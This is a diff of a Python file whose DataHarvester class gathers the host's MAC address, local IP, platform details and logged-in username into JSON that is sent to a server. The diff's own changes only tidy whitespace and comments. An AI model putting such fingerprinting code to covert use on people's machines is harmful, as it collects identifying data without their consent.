@@ -6,21 +6,20 @@ import platform
 from getmac import get_mac_address as gma
 
 
-
 class DataHarvester:
+
 
     def get_local_ip(self):
         try:
             with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                 s.connect(("8.8.8.8", 80))  # Connect to Google's public DNS server
-                return s.getsockname()[0]  # Return the local IP address used for this connection
+                return s.getsockname()[0]
         except Exception as e:
             return None
 
 
     # returns client system information to the server
     def get_platform_info(self):
-
         system_info = {
                          "mac-address": gma(),
                          "ip": self.get_local_ip(),
@@ -33,7 +32,6 @@ class DataHarvester:
                          "time-joined": str(datetime.datetime.now().time()),
                          "user": getpass.getuser()
                     }
-
 
         system_info = json.dumps(system_info)
         return system_info
